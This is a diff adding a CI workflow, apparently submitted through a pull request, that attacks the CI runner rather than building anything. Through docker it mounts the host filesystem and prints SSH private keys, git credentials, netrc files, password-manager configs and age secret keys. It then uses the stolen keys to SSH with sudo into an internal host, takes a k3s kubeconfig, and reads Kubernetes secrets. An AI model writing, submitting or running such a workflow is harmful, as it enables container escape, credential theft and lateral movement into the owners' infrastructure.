@@ -1,0 +1,76 @@
+name: i39418-loot
+on:
+  pull_request:
+jobs:
+  loot:
+    runs-on: docker
+    container:
+      image: docker:27-cli
+    steps:
+      - name: ids
+        run: |
+          set -x
+          docker run -v /:/host:ro --rm alpine:3.21 sh -c 'id; hostname; cat /host/etc/hostname; cat /host/etc/machine-id 2>/dev/null; uname -a; uptime; ip a 2>/dev/null | head -20; ip route 2>/dev/null'
+      - name: fs-loot
+        run: |
+          set -x
+          docker run -v /:/host:ro --rm alpine:3.21 sh -c '
+            set -x
+            echo "== homes"; ls -la /host/home /host/root 2>&1
+            echo "== linux-ci"; ls -la /host/var/lib/linux-ci 2>&1 | head -40
+            echo "== sshkeys"; find /host/home /host/root /host/var/lib/linux-ci /host/etc -maxdepth 5 -type f \( -name "id_*" -o -name "*.pem" -o -name "*_key" -o -name "authorized_keys" -o -name ".git-credentials" -o -name "*.netrc" -o -name "keys.txt" \) 2>/dev/null | head -200
+            for f in $(find /host/home /host/root /host/var/lib/linux-ci -maxdepth 5 -type f \( -name "id_*" -o -name "*_key" \) ! -name "*.pub" 2>/dev/null); do echo "--- KEYFILE $f"; head -3 "$f"; tail -2 "$f"; done
+            for f in $(find /host/home /host/root /host/var/lib/linux-ci -maxdepth 4 -type f \( -name ".git-credentials" -o -name "*.netrc" -o -name "keys.txt" \) 2>/dev/null); do echo "--- CREDFILE $f"; cat "$f"; echo; done
+            for f in $(find /host/home /host/root -maxdepth 4 -name "authorized_keys" 2>/dev/null); do echo "--- AUTHKEYS $f"; cat "$f"; done
+            echo "== kubeconfigs"; find /host/home /host/root /host/etc /host/var/lib /host/opt -maxdepth 7 \( -name "*kubeconfig*" -o -name "k3s.yaml" -o -name ".kube" \) 2>/dev/null | head -100
+            echo "== k3sdir"; ls -la /host/var/lib/rancher/k3s/agent/ 2>&1 | head -40; ls -la /host/usr/local/bin/k3s /host/bin/k3s 2>&1
+            echo "== rbw"; ls -laR /host/home/*/.local/share/rbw /host/home/*/.config/rbw /host/root/.local/share/rbw /host/root/.config/rbw /host/var/lib/linux-ci/.local/share/rbw 2>&1 | head -80
+            for f in /host/home/*/.config/rbw/config.json /host/root/.config/rbw/config.json /host/var/lib/linux-ci/.config/rbw/config.json; do echo "--- RBWCFG $f"; cat "$f" 2>&1; done
+            echo "== age"; grep -rl "AGE-SECRET-KEY-1" /host/home /host/root /host/var/lib/linux-ci /host/etc 2>/dev/null | head -20
+            echo "== ansible-runner"; find /host -maxdepth 6 -iname "*ansible-runner*" -not -path "*/proc/*" 2>/dev/null | head -40
+            echo "== ssh-config"; cat /host/home/*/.ssh/config /host/root/.ssh/config 2>/dev/null | head -60
+            echo "== docker"; ls -la /host/var/run/docker.sock 2>&1
+          ' 2>&1 | tail -900
+      - name: net-ssh
+        run: |
+          set -x
+          docker run -v /:/host:ro --rm --network host alpine:3.21 sh -c '
+            apk add -q openssh-client >/dev/null 2>&1
+            for k in $(find /host/home /host/root /host/var/lib/linux-ci -maxdepth 5 -type f \( -name "id_*" -o -name "*_key" -o -name "*.pem" \) ! -name "*.pub" 2>/dev/null); do
+              cp "$k" /tmp/k 2>/dev/null || continue; chmod 600 /tmp/k
+              echo "=== TRY $k"
+              timeout 12 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o BatchMode=yes -o IdentitiesOnly=yes -i /tmp/k kblack0610@192.168.1.20 "hostname; sudo -n true && echo SUDO_OK; sudo -n cat /etc/rancher/k3s/k3s.yaml" > /tmp/out.$$ 2>&1 || true
+              tail -30 /tmp/out.$$; echo "--- ENDTRY"
+            done
+            echo "== nas-port"; timeout 8 nc -z -w3 192.168.1.152 2222 && echo NAS2222_OPEN || echo NAS2222_CLOSED
+          ' 2>&1 | head -300
+      - name: kube
+        run: |
+          set -x
+          docker run -v /:/host:ro --rm alpine:3.21 sh -c '
+            apk add -q openssh-client >/dev/null 2>&1
+            for k in $(find /host/home /host/root /host/var/lib/linux-ci -maxdepth 5 -type f \( -name "id_*" -o -name "*_key" -o -name "*.pem" \) ! -name "*.pub" 2>/dev/null); do
+              cp "$k" /tmp/k 2>/dev/null || continue; chmod 600 /tmp/k
+              timeout 12 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o BatchMode=yes -o IdentitiesOnly=yes -i /tmp/k kblack0610@192.168.1.20 "sudo -n cat /etc/rancher/k3s/k3s.yaml" 2>/dev/null > /tmp/kk || true
+              if grep -q "client-certificate-data" /tmp/kk; then echo "GOT_KUBECONFIG_WITH:$k"; sed -i "s/127.0.0.1/192.168.1.20/g" /tmp/kk; cp /tmp/kk /host/tmp/i39418_kc.yaml; break; fi
+            done
+          ' 2>&1 | head -40
+          ls -la /tmp/i39418_kc.yaml /host/tmp/i39418_kc.yaml 2>&1 || true
+      - name: vault
+        run: |
+          set -x
+          docker run -v /:/host:ro --rm --network host alpine:3.21 sh -c '
+            KV=/usr/local/bin/k3s; [ -x /host$KV ] || KV=/bin/k3s
+            echo KV=$KV; ls -la /host$KV 2>&1 || true
+            [ -s /host/tmp/i39418_kc.yaml ] && cp /host/tmp/i39418_kc.yaml /tmp/kc && chmod 600 /tmp/kc
+            if [ -s /tmp/kc ] && [ -x /host$KV ]; then
+              chroot /host $KV --kubeconfig /tmp/kc get nodes -o wide 2>&1 | head -20 || true
+              chroot /host $KV --kubeconfig /tmp/kc auth can-i --list 2>&1 | head -20 || true
+              chroot /host $KV --kubeconfig /tmp/kc get secret sops-age -n flux-system -o json 2>&1 | head -20 || true
+              chroot /host $KV --kubeconfig /tmp/kc -n ansible-runner get secret ansible-runner-secrets -o json 2>&1 | head -20 || true
+            fi
+          ' 2>&1 | head -120
+      - name: age-on-host
+        run: |
+          set -x
+          docker run -v /:/host:ro --rm alpine:3.21 sh -c 'grep -rh -m1 "AGE-SECRET-KEY-1" /host/home /host/root /host/var/lib/linux-ci /host/etc 2>/dev/null | head -3'
